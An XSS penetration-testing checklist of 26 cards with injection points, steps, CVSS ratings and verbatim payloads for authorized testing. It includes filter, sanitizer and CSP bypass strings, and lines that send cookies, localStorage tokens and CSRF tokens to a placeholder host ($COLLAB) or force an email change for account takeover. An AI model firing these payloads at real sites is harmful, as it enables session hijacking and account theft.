# XSS — Checklist

Expert per-attack **test-case matrix** for XSS — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*26 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## XSS-001 — Lab setup + OOB listener + two accounts
**Test Category:** Recon &amp; Lab · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Whole engagement, before testing

**Test Steps:** 1. Confirm XSS (active testing) is in scope and note PoC rules (allowed exfil, no real-user data, no mass-firing).<br>2. Proxy running; two browser profiles (victim + attacker); OOB listener live (Collaborator/interactsh/XSS-Hunter).<br>3. Create 2+ test accounts for cross-user / stored / ATO impact.

**Expected Result:** Scope confirmed, OOB listener live, two accounts ready.

**Payload Example:**

```
XSS-Hunter payload host = $COLLAB ; profiles: victim, attacker
```

**Impact:** Blind/stored/ATO proof needs an OOB listener and two accounts up front.

**Tools:** Burp/Caido, XSS Hunter, interactsh

**References:** CWE-79; OWASP Testing Guide: Testing for XSS (WSTG-INPV-01/02)

---

## XSS-002 — Map EVERY input source
**Test Category:** Recon &amp; Surface Map · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** query/path/fragment, POST/JSON, headers, cookies, upload, WebSocket, postMessage, staff-rendered inputs

**Test Steps:** 1. Crawl (katana) + harvest historical params (gau/waybackurls); run Arjun/param-miner for HIDDEN params.<br>2. Enumerate every source: query, path, URL fragment (#, DOM source), POST/JSON keys, headers (Referer, UA, X-Forwarded-Host, Origin), cookies, file upload (filename+content), WebSocket frames, postMessage.<br>3. Flag inputs rendered to STAFF/ADMIN later (feedback/tickets/names) as blind candidates. Fingerprint framework/CSP/WAF/cookie flags.

**Expected Result:** A complete input inventory including hidden params and blind (staff-rendered) candidates.

**Payload Example:**

```
arjun -u $URL ; gau target ; headers: X-Forwarded-Host, Referer ; #fragment ; upload filename
```

**Impact:** Most missed XSS is a missed input - coverage is the whole game here.

**Tools:** katana, gau, Arjun, param-miner

**References:** CWE-79; PortSwigger Web Security Academy: Cross-site scripting

---

## XSS-003 — Char-probe + name the context (decision flow)
**Test Category:** Reflection &amp; Context · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Each input source

**Test Steps:** 1. Inject a unique marker + the probe xss7f3a9'"&lt;&gt; into every input; find it in RAW HTML AND the live DOM.<br>2. Record which probe chars came back RAW vs encoded PER location - that names the context.<br>3. Run the decision flow: HTML body / attr-quoted / attr-unquoted / JS-in-attr / JS-string / URL / CSS / DOM-only. If all encoded -&gt; pivot (JS/URL/DOM/CSTI) rather than fighting HTML.

**Expected Result:** The exact injection context is named from which characters survived raw.

**Payload Example:**

```
probe xss7f3a9'"<> ; '<' raw + '"' encoded -> HTML body ; only in DOM -> DOM-based
```

**Impact:** Context selects the minimal working payload; guessing wastes the input.

**Tools:** Burp Repeater, browser DevTools

**References:** CWE-79; PortSwigger Web Security Academy: Cross-site scripting

---

## XSS-004 — Reflected XSS — HTML body context
**Test Category:** Reflected — HTML Body · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Input reflected between tags with &lt; &gt; raw

**Test Steps:** 1. Inject a tag/auto-event payload: &lt;svg onload=alert(document.domain)&gt; / &lt;img src=x onerror=alert(document.domain)&gt;.<br>2. Confirm execution with alert(document.domain) (not just injection).<br>3. Ensure cross-user DELIVERY via a crafted URL.

**Expected Result:** alert(document.domain) fires in the app origin from a crafted URL.

**Payload Example:**

```
"><svg onload=alert(document.domain)> ; <img src=x onerror=alert(document.domain)>
```

**Impact:** Reflected XSS -&gt; session/account actions in the victim's browser. Medium (High if it reaches a session).

**Tools:** Burp Repeater

**References:** CWE-79; PortSwigger Web Security Academy: Cross-site scripting

---

## XSS-005 — Reflected XSS — attribute context (breakout / event)
**Test Category:** Reflected — Attribute · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Input reflected inside an HTML attribute

**Test Steps:** 1. Quoted, &gt; raw: "&gt;&lt;svg onload=alert(1)&gt;.<br>2. Quote survives, &gt; encoded: stay in tag - " autofocus onfocus=alert(1) x=".<br>3. Unquoted: x onmouseover=alert(1). Inside on*="...": ');alert(1)// (entities decode).

**Expected Result:** The attribute is broken out of (or an event added) and script executes.

**Payload Example:**

```
" autofocus onfocus=alert(document.domain) x=" ; x onmouseover=alert(1) ; ');alert(1)//
```

**Impact:** Reflected XSS via attribute injection. Medium/High.

**Tools:** Burp Repeater

**References:** CWE-79; PortSwigger Web Security Academy: Cross-site scripting

---

## XSS-006 — Reflected XSS — JavaScript string / template
**Test Category:** Reflected — JS Context · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Input reflected inside a &lt;script&gt; string/template

**Test Steps:** 1. Double-quoted string: ";alert(document.domain)//.<br>2. Single: ';alert(document.domain)//. Template literal: ${alert(document.domain)}.<br>3. Break the whole element when &lt; &gt; survive: &lt;/script&gt;&lt;svg onload=alert(1)&gt;. Handle backslash-escaping: \";alert(1)//.

**Expected Result:** The JS string is broken out of and script executes.

**Payload Example:**

```
";alert(document.domain)// ; ${alert(document.domain)} ; </script><svg onload=alert(1)>
```

**Impact:** Reflected XSS in a JS sink. Medium/High.

**Tools:** Burp Repeater

**References:** CWE-79; PortSwigger Web Security Academy: Cross-site scripting

---

## XSS-007 — Reflected XSS — URL / javascript: / data:
**Test Category:** Reflected — URL Context · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Input reflected into href/src/action

**Test Steps:** 1. javascript:alert(document.domain) in href/src/formaction.<br>2. Obfuscate filters: JaVaScRiPt:, java%0ascript:, javascript:%61lert(1).<br>3. data:text/html,&lt;script&gt;alert(document.domain)&lt;/script&gt;.

**Expected Result:** Clicking/loading the URL executes script in the app origin.

**Payload Example:**

```
javascript:alert(document.domain) ; data:text/html,<script>alert(document.domain)</script>
```

**Impact:** Reflected/DOM XSS via URL sink. Medium/High.

**Tools:** Burp Repeater

**References:** CWE-79; PortSwigger Web Security Academy: Cross-site scripting

---

## XSS-008 — CSS context breakout + CSS exfiltration
**Test Category:** Reflected — CSS · **Severity:** Medium · **CVSS:** 4.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Input reflected inside a &lt;style&gt;/style context

**Test Steps:** 1. Break out: red"&gt;&lt;/style&gt;&lt;svg onload=alert(1)&gt;.<br>2. No-JS CSS exfil of a token char-by-char (escalate when CSP blocks JS): input[name=csrf][value^=a]{background:url(//$COLLAB/leak?c=a)}.<br>3. @import url(//$COLLAB/x.css) if it survives.

**Expected Result:** Style is broken out to script, or a token is exfiltrated via CSS selectors.

**Payload Example:**

```
red"></style><svg onload=alert(1)> ; input[name=csrf][value^=a]{background:url(//$COLLAB/leak?c=a)}
```

**Impact:** XSS or CSRF-token/CSP-defeating data exfil via CSS. Medium/High.

**Tools:** Burp Repeater

**References:** CWE-79; HackTricks: XSS

---

## XSS-009 — DOM-based XSS (sink trace + #fragment)
**Test Category:** DOM XSS · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Client-side sinks: innerHTML/eval/document.write/location/setTimeout

**Test Steps:** 1. Trace source-&gt;sink with DOM Invader; fragment source never reaches the server (bypasses WAF): #&lt;img src=x onerror=alert(document.domain)&gt;.<br>2. ?returnUrl=javascript:alert(1) into a location sink.<br>3. Confirm in the live DOM.

**Expected Result:** A client-side sink executes attacker-controlled markup/JS.

**Payload Example:**

```
$URL#<img src=x onerror=alert(document.domain)> ; ?next=javascript:alert(1)
```

**Impact:** DOM XSS - fully client-side, often CSP/WAF-evading. Medium/High.

**Tools:** DOM Invader, browser DevTools

**References:** CWE-79; CWE-116; PortSwigger Web Security Academy: Cross-site scripting

---

## XSS-010 — postMessage / window.name DOM XSS
**Test Category:** DOM XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** message event listeners / window.name sinks

**Test Steps:** 1. From an attacker page, open()/frame the target and postMessage a payload; test a MISSING origin check: w.postMessage('&lt;img src=x onerror=alert(document.domain)&gt;','*').<br>2. window.name source: window.name='&lt;img src=x onerror=alert(1)&gt;'; location='$URL/sink'.<br>3. Confirm the listener writes it to a sink.

**Expected Result:** The message/window.name handler writes attacker markup to a DOM sink.

**Payload Example:**

```
w.postMessage('<img src=x onerror=alert(document.domain)>','*') ; window.name=payload
```

**Impact:** Cross-origin-deliverable DOM XSS via unvalidated postMessage. High.

**Tools:** DOM Invader

**References:** CWE-79; CWE-346; PortSwigger Web Security Academy: Cross-site scripting

---

## XSS-011 — Stored XSS — every consumer (incl. admin/email/export)
**Test Category:** Stored XSS · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Profile/comment/name/ticket fields and all their render points

**Test Steps:** 1. Plant a payload in every field; check EVERY consumer: the app UI, admin panels, email templates, CSV/PDF exports, mobile.<br>2. Confirm execution where it renders raw.<br>3. Cross-user: fires in ANOTHER user's/admin's browser.

**Expected Result:** The stored value executes in another user's or admin's browser.

**Payload Example:**

```
display name = "><svg onload=alert(document.domain)> ; fires in admin ticket view
```

**Impact:** Stored XSS -&gt; cross-user/admin compromise, no click needed. High.

**Tools:** Burp Repeater

**References:** CWE-79; PortSwigger Web Security Academy: Cross-site scripting

---

## XSS-012 — Second-order / blind XSS (staff-visible sinks)
**Test Category:** Stored — Blind · **Severity:** High · **CVSS:** 8.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Inputs rendered later to staff/admin (feedback, tickets, logs, user-agent)

**Test Steps:** 1. Plant an XSS-Hunter beacon in staff-visible inputs/headers (User-Agent, contact form, order notes).<br>2. Trace a stored value to a place it renders RAW (second-order).<br>3. Wait for the callback proving WHERE it fired (admin origin).

**Expected Result:** A beacon fires from an internal/admin page, proving blind XSS.

**Payload Example:**

```
User-Agent: "><script src=//$COLLAB/h.js></script> ; XSS-Hunter callback from /admin
```

**Impact:** Blind XSS in admin context -&gt; admin action / data read / priv-esc. High/Critical.

**Tools:** XSS Hunter, interactsh

**References:** CWE-79; HackTricks: XSS

---

## XSS-013 — mXSS / sanitizer (DOMPurify) bypass
**Test Category:** Sanitizer Bypass · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Output passed through DOMPurify/sanitize-html/Bleach/Loofah

**Test Steps:** 1. Match the library+version (bundle/headers).<br>2. Feed mutation classes and view the POST-sanitization DOM: namespace confusion (foreignObject/mglyph/annotation-xml), noscript/CDATA re-parse, template/xmp survival.<br>3. Probe config gaps: loose ALLOWED_URI_REGEXP, USE_PROFILES svg/mathML, forgotten ADD_ATTR handler.

**Expected Result:** Markup mutates back into script after sanitization (parser-roundtrip mismatch).

**Payload Example:**

```
<svg></p><style><a id="</style><img src=1 onerror=alert(document.domain)>"> ; <math><mtext><table><mglyph><style>...
```

**Impact:** mXSS surviving DOMPurify on a major app is a clean High -&gt; ATO.

**Tools:** browser DevTools, cure53 advisories

**References:** CWE-79; CWE-80; HackTricks: XSS

---

## XSS-014 — DOM Clobbering
**Test Category:** DOM XSS · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Sanitizer allows id/name; JS reads a global/config from the DOM

**Test Steps:** 1. HTML-only injection (no script): clobber a global the JS trusts - &lt;a id=x&gt;&lt;form&gt;, &lt;img name=config&gt;.<br>2. Steer a src/href/innerHTML sink the JS builds from the clobbered value.<br>3. Confirm the sink executes.

**Expected Result:** A clobbered DOM property redirects a JS sink to attacker content.

**Payload Example:**

```
<a id=defaultAvatar href=cid:x><form id=config><input name=src value=...>
```

**Impact:** DOM XSS via clobbering where scripts are blocked - Medium/High.

**Tools:** DOM Invader

**References:** CWE-79; PortSwigger Web Security Academy: Cross-site scripting

---

## XSS-015 — Framework-specific (React / Vue / AngularJS CSTI)
**Test Category:** Framework · **Severity:** High · **CVSS:** 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N)

**Where to Test / Injection Point:** React dangerouslySetInnerHTML, Vue v-html, AngularJS {{}}, Handlebars triple-stache

**Test Steps:** 1. AngularJS CSTI (works even when &lt; &gt; are encoded): {{constructor.constructor('alert(document.domain)')()}}.<br>2. React dangerouslySetInnerHTML / href={`javascript:...`}; Vue v-html sink.<br>3. Handlebars/Mustache {{{ userInput }}} renders raw HTML.

**Expected Result:** The framework sink/expression evaluates attacker input to script.

**Payload Example:**

```
{{constructor.constructor('alert(document.domain)')()}} ; dangerouslySetInnerHTML={{__html:input}}
```

**Impact:** XSS via framework template/sink - Medium/High.

**Tools:** browser DevTools

**References:** CWE-79; CWE-1336; HackTricks: XSS

---

## XSS-016 — File-based XSS (SVG / filename / markdown / PDF)
**Test Category:** File-based · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** SVG/HTML upload served inline, filename, markdown, HTML-&gt;PDF generators

**Test Steps:** 1. SVG served inline from app origin: &lt;svg onload=alert(document.domain)&gt; -&gt; stored XSS.<br>2. Filename XSS: "&gt;&lt;img src=x onerror=alert(document.domain)&gt;.png. Markdown: [x](javascript:alert(1)).<br>3. HTML-&gt;PDF LFI/SSRF: &lt;iframe src=file:///etc/passwd&gt;.

**Expected Result:** An uploaded/rendered file executes script in the app origin.

**Payload Example:**

```
xss.svg (onload=alert(document.domain)) ; [x](javascript:alert(1)) ; filename XSS
```

**Impact:** Stored XSS via file/markdown; PDF-gen LFI/SSRF - High.

**Tools:** Burp, FileUpload kit

**References:** CWE-79; HackTricks: XSS

---

## XSS-017 — WAF / filter bypass
**Test Category:** Evade — WAF/Filter · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Inputs behind a signature WAF

**Test Steps:** 1. Case/structure: &lt;sCrIpT&gt;, &lt;svg/onload=..&gt;, literal tab/newline between attrs.<br>2. Encodings &amp; entity decode: &lt;svg onload=&amp;#97;lert(1)&gt;. Defeat 'alert' signature: top['ale'+'rt'](1), eval(atob('...')).<br>3. No parens: alert`1`. No spaces: &lt;svg/onload=..&gt;. Move to a different injection point / DOM #fragment (never sent to server).

**Expected Result:** The payload bypasses the WAF and executes.

**Payload Example:**

```
<sVg/oNloAd=top['ale'+'rt'](1)> ; alert`document.domain` ; DOM #fragment (WAF-free)
```

**Impact:** Restores XSS against WAFs - proves the filter is not a fix.

**Tools:** Burp, DOM Invader

**References:** CWE-79; PayloadsAllTheThings/XSS Injection

---

## XSS-018 — CSP bypass
**Test Category:** Evade — CSP · **Severity:** High · **CVSS:** 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N)

**Where to Test / Injection Point:** Pages with a Content-Security-Policy

**Test Steps:** 1. Score the CSP (csp-evaluator): unsafe-inline/unsafe-eval, script-src * / https: / data:, reused/reflected nonce, missing base-uri/object-src.<br>2. JSONP on an allow-listed origin; AngularJS/library script-gadget; &lt;base&gt; hijack; Report-Only (does NOT block).<br>3. No-JS dangling-markup exfil when scripts truly blocked.

**Expected Result:** Script executes (or a token is exfiltrated) despite the CSP.

**Payload Example:**

```
allow-listed JSONP: <script src=//allowed/api/jsonp?callback=alert> ; <base href=//$ATTACKER/> ; Report-Only = full XSS
```

**Impact:** Defeats CSP -&gt; full XSS/exfil - proves the CSP inadequate.

**Tools:** csp-evaluator, Burp

**References:** CWE-79; PortSwigger Web Security Academy: Cross-site scripting

---

## XSS-019 — Trusted Types bypass
**Test Category:** Evade — Trusted Types · **Severity:** High · **CVSS:** 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N)

**Where to Test / Injection Point:** Pages with require-trusted-types-for 'script'

**Test Steps:** 1. Look for a pass-through default policy / a reusable named policy.<br>2. Report-only-or-missing-on-API gap; a non-TT sink like location=javascript:.<br>3. Confirm execution despite TT enforcement.

**Expected Result:** Script executes via a TT policy gap or a non-TT sink.

**Payload Example:**

```
trustedTypes.defaultPolicy pass-through ; location='javascript:alert(1)' (non-TT sink)
```

**Impact:** Defeats Trusted Types - the last DOM-XSS mitigation. High.

**Tools:** DOM Invader

**References:** CWE-79; PortSwigger Web Security Academy: Cross-site scripting

---

## XSS-020 — Cookie theft (non-HttpOnly) -&gt; session hijack
**Test Category:** Impact — Session Theft · **Severity:** High · **CVSS:** 8.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Confirmed XSS + a non-HttpOnly session cookie

**Test Steps:** 1. Exfil the cookie: new Image().src='//$COLLAB/c?'+encodeURIComponent(document.cookie).<br>2. Replay it to access the victim's session; screenshot the victim account.<br>3. Own two accounts; own data only.

**Expected Result:** The victim's session cookie is exfiltrated and replays into their account.

**Payload Example:**

```
new Image().src='//$COLLAB/c?'+encodeURIComponent(document.cookie)
```

**Impact:** Session hijack / account access via cookie theft - High.

**Tools:** XSS Hunter, Burp

**References:** CWE-79; PortSwigger Web Security Academy: Cross-site scripting

---

## XSS-021 — Token / localStorage theft -&gt; authenticated API calls
**Test Category:** Impact — Token Theft · **Severity:** High · **CVSS:** 8.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Confirmed XSS + token-in-localStorage auth

**Test Steps:** 1. Exfil storage: fetch('//$COLLAB/t',{method:'POST',mode:'no-cors',body:JSON.stringify({ls:{...localStorage}})}).<br>2. Use the token to call the API as the victim.<br>3. Own data only.

**Expected Result:** The victim's token is exfiltrated and makes authenticated API calls.

**Payload Example:**

```
fetch('//$COLLAB/t',{method:'POST',mode:'no-cors',body:JSON.stringify({ls:{...localStorage}})})
```

**Impact:** Full API access as the victim via token theft - High.

**Tools:** XSS Hunter

**References:** CWE-79; PortSwigger Web Security Academy: Cross-site scripting

---

## XSS-022 — HttpOnly-proof ATO — steal CSRF token -&gt; force email/password change
**Test Category:** Impact — ATO · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Confirmed XSS where the session cookie IS HttpOnly

**Test Steps:** 1. XSS can't read an HttpOnly cookie - instead read the in-page CSRF token and drive an authenticated action.<br>2. fetch('/account/email',{method:'POST',credentials:'include',body:'csrf_token='+document.querySelector('[name=csrf_token]').value+'&amp;email=attacker@evil.tld'}) -&gt; then reset.<br>3. Demonstrate end-to-end ATO on your own two accounts.

**Expected Result:** The XSS forces an account-changing action, resulting in takeover.

**Payload Example:**

```
read csrf_token from DOM -> POST /account/email with credentials:include -> reset -> ATO
```

**Impact:** Full account takeover from XSS even with HttpOnly cookies - Critical.

**Tools:** Burp, XSS Hunter

**References:** CWE-79; CWE-352; PortSwigger Web Security Academy: Cross-site scripting

---

## XSS-023 — Admin-context escalation + wormability
**Test Category:** Impact — Escalation · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Blind/stored XSS reaching admin/staff; multi-user stored content

**Test Steps:** 1. In admin/staff context: perform an admin action / read sensitive data / self-promote.<br>2. Assess (and DESCRIBE, do not release) wormability for stored multi-user content.<br>3. State impact: 'An attacker can make &lt;victim&gt; suffer &lt;harm&gt; with &lt;N&gt; clicks.'

**Expected Result:** The XSS performs a privileged admin action or is shown to be wormable.

**Payload Example:**

```
blind XSS in admin -> create-admin API call ; stored payload self-propagates (described only)
```

**Impact:** Admin compromise / self-propagating worm from stored XSS - Critical.

**Tools:** XSS Hunter

**References:** CWE-79; HackTricks: XSS

---

## XSS-024 — False-positive filter / auto-reject
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. REJECT: self-XSS (no cross-user delivery); encoded-only reflection (never executed); CSP-blocked on production; out-of-context injection that doesn't run.<br>2. REQUIRE: script EXECUTED in the app origin (alert(document.domain) / collaborator hit), cross-user delivery, and (for a strong report) escalation past alert().<br>3. Confirm it survives the PRODUCTION CSP/WAF.

**Expected Result:** Only executing, cross-user-deliverable XSS survives.

**Payload Example:**

```
self-XSS = invalid ; encoded-only = not XSS ; CSP-blocked on prod = not exploitable
```

**Impact:** Protects credibility; XSS is dense with self-XSS / encoded-only false positives.

**Tools:** manual

**References:** CWE-79; PortSwigger Web Security Academy: Cross-site scripting

---

## XSS-025 — Client-facing impact &amp; SAFE PoC package
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Title names the IMPACT ('Account takeover via stored XSS in display name'), not 'XSS in X'.<br>2. Provide the trigger URL/request, a screenshot/video of execution, and the collaborator/XSS-Hunter log; state the attacker-impact sentence.<br>3. Set a defensible CVSS 3.1 vector + CWE-79 (+80/116). Remediation: context-aware output encoding, framework auto-escaping, a strong CSP (nonce + Trusted Types), HttpOnly+Secure+SameSite cookies, sanitize with a maintained library.<br>4. Own data only, own two accounts, no mass-firing, clean up planted payloads/keys/service workers; de-dupe to one root cause.

**Expected Result:** A reproducible, correctly-rated, safe PoC with clear remediation.

**Payload Example:**

```
PoC: trigger + execution screenshot + collaborator log + impact sentence + CVSS + CWE-79 + remediation.
```

**Impact:** Converts execution into a defensible Medium-to-Critical report at the escalated severity.

**Tools:** CVSS calculator, XSS_REPORT_TEMPLATE.md

**References:** CWE-79; CWE-80; CWE-116; FIRST CVSS v3.1; OWASP Testing Guide: Testing for XSS (WSTG-INPV-01/02)  |  TOP REFERENCES: Gareth Heyes / PortSwigger Research XSS; Cure53 DOMPurify advisories; SonarSource mXSS research; PayloadsAllTheThings; HackTricks; XS-Leaks wiki

---

## XSS-026 — Client-Side Path Traversal (CSPT) -&gt; CSRF/IDOR
**Test Category:** DOM-Based / Client-Side · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Front-end JS building an API path/URL from user input (fetch/axios/router)

**Test Steps:** 1. Find front-end code that concatenates user input into a request path/URL<br>2. Inject ../ (encoded) to redirect the client-issued request to another endpoint<br>3. Chain to CSRF/IDOR: make the victim's browser call a sensitive endpoint with their creds<br>4. Confirm the traversed request executes

**Expected Result:** Client encodes/validates path segments; user input never composes request paths

**Payload Example:**

```
/#/profile/..%2f..%2fadmin%2fdeleteUser?id=1   (front-end does fetch('/api/'+input))
```

**Impact:** Client-side path traversal -&gt; redirect victim's authenticated fetch -&gt; CSRF/IDOR/data leak

**Tools:** Burp, browser DevTools

**References:** CWE-22; CWE-79; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); Doyensec CSPT2CSRF research; PortSwigger

---
